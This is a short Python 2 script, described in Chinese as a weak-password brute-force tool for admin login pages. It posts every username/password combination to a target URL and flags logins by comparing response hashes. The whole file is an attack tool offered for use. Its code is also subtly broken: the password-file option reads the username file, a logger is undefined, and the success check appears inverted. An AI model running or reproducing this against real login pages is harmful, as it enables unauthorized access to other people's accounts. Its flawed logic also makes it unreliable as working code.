# coding:utf-8
import requests
import argparse
import sys
import hashlib

def Argparse():
    parser = argparse.ArgumentParser(usage="%(prog)s [options]",add_help=False,
    formatter_class=argparse.RawDescriptionHelpFormatter,
    description=(u'''
        作者：End1ng blog:end1ng.github.io
        --------------------------------
        后台弱口令爆破工具'''))

    optional = parser.add_argument_group('optional arguments')
    optional.add_argument('-h', '--help', action="store_true", help='help of the %(prog)s program')
    optional.add_argument('--version', action='version', version='%(prog)s 1.1')

    args = parser.add_argument_group('Necessary parameter')
    args.add_argument('-i','--ip',metavar=u'url',help=u'目标url')
    args.add_argument('-u','--user', nargs='*',metavar=u'姓名',help=u'*用户名 多个用空格分隔')
    args.add_argument('-U','--userfile',metavar=u'文件',help=u'*用户名列表文件')
    args.add_argument('-p','--pass', nargs='*',metavar=u'密码',help=u'*密码 多个用空格分隔')
    args.add_argument('-P','--passfile',metavar=u'文件',help=u'*密码列表文件')
    args.add_argument('-n','--noword',metavar=u'str',help=u'登陆失败字符')

    args=parser.parse_args()
    args = vars(args)

    if len(sys.argv) == 1 or args['help']:
        parser.print_help()
        sys.exit()
    if not args['user'] and not args['userfile']:
        LOG.error(u" 请输入账号")
        sys.exit()
    if not args['pass'] and not args['passfile']:
        LOG.error(u" 请输入密码")
        sys.exit()
    if not args['ip']:
        LOG.error(u" 请输入url")
        sys.exit()

    return args

ARGS = Argparse()
userlist = []
passlist = []

if ARGS['user']:
    userlist.extend(ARGS['user'])
elif ARGS['userfile']:
    with open(ARGS['userfile'],"r") as f:
        userlist.extend(f.readlines())
if ARGS['pass']:
    passlist.extend(ARGS['pass'])
elif ARGS['passfile']:
    with open(ARGS['userfile'],"r") as f:
        passlist.extend(f.readlines())

datalist = []

m1 = hashlib.md5()
m1.update(requests.post(ARGS["ip"]).content)
sres = m1.hexdigest()

for u in userlist:
    for p in passlist:
        datalist.append({"username": u, "password": p})

for x in datalist:
    data = x
    res = requests.post(ARGS["ip"], data = data)
    m2 = hashlib.md5()
    m2.update(res.content)
    if m2.hexdigest() != sres :
        print u"登陆失败 %s %s"%(x["username"], x["password"])
    else:
        print u"登陆成功 %s %s"%(x["username"], x["password"])
        sys.exit()



